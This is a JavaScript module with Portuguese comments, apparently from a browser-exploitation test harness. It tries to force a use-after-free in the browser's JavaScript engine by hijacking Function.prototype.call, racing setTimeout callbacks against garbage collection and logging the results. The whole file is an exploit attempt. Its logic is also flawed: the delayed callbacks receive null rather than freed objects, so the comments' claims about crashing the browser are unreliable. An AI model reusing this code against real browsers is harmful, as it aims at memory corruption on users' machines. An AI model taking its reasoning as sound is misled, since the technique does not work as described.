// js/script3/testAdvancedPP.mjs
// ATUALIZADO PARA TENTATIVA AVANÇADA DE USE-AFTER-FREE (UAF) ASSÍNCRONO

import { logS3, PAUSE_S3 } from './s3_utils.mjs';

const UAF_ITERATIONS = 20000; // Menos iterações, pois cada uma é mais complexa e lenta.

/**
 * Tenta forçar uma condição de Use-After-Free usando setTimeout para criar uma corrida
 * entre o uso de um objeto e sua coleta pelo Garbage Collector.
 */
async function advanced_UAF_Attempt_With_SetTimeout() {
    const FNAME = 'AdvancedUAF_SetTimeout';
    logS3(`--- Tentativa Avançada de UAF com setTimeout ---`, 'test', FNAME);
    logS3(`Iterações: ${UAF_ITERATIONS}`, 'info', FNAME);
    const originalCallDescriptor = Object.getOwnPropertyDescriptor(Function.prototype, 'call');
    let uafCount = 0;
    let errorCount = 0;

    // A função que será chamada no futuro, tentando usar a vítima.
    const useVictim = (victim) => {
        try {
            // O gatilho é uma chamada de função na vítima.
            // Se a vítima já foi liberada pelo GC, esta linha pode travar o navegador.
            Object.keys.call(victim);
        } catch (e) {
            // Um erro aqui é interessante. Pode significar que 'victim' não é mais um objeto válido.
            errorCount++;
        }
    };
    
    try {
        const hijackFunction = () => { uafCount++; };
        Object.defineProperty(Function.prototype, 'call', { value: hijackFunction, configurable: true });

        logS3("Iniciando loop de UAF Assíncrono...", 'warn', FNAME);
        logS3("Cada iteração agenda um 'uso' futuro e imediatamente 'libera' o objeto.", 'info', FNAME);

        for (let i = 0; i < UAF_ITERATIONS; i++) {
            // 1. ALOCAR VÍTIMA
            let victim = { id: i, payload: new Uint8Array(256) };

            // 2. AGENDAR O "USO"
            setTimeout(() => useVictim(victim), Math.random() * 10); // Adiciona um pequeno jitter aleatório

            // 3. "LIBERAR" A VÍTIMA
            victim = null;
            
            // 4. PRESSIONAR O GARBAGE COLLECTOR (opcional, mas ajuda)
            // Alocar pequenos objetos força o GC a trabalhar mais.
            let pressure = new Array(50).fill(0);

            if (i % 2000 === 0) {
                 logS3(`Progresso: ${i}/${UAF_ITERATIONS}... Usos agendados: ${uafCount}, Erros de acesso: ${errorCount}`, 'info', FNAME);
                 await PAUSE_S3(20); // Pausa para a UI e para os timeouts se acumularem
            }
        }

        logS3("Loop de agendamento concluído. Aguardando timeouts restantes...", 'good', FNAME);
        await PAUSE_S3(2000); // Pausa longa para garantir que a maioria dos timeouts execute.

    } catch (e) {
        logS3(`ERRO CRÍTICO durante o setup do Teste de UAF: ${e.message}`, 'error', FNAME);
    } finally {
        logS3("Limpando e restaurando 'call'...", 'info', FNAME);
        if (originalCallDescriptor) {
            Object.defineProperty(Function.prototype, 'call', originalCallDescriptor);
        }
        logS3(`Total de chamadas sequestradas (pode ser menor que iterações): ${uafCount}`, 'info', FNAME);
        logS3(`Total de erros de acesso em timeouts: ${errorCount}`, 'info', FNAME);
    }
}


/**
 * Função principal que orquestra a execução da tentativa de UAF.
 */
export async function runAdvancedUAF_Attempts() {
    await advanced_UAF_Attempt_With_SetTimeout();
}
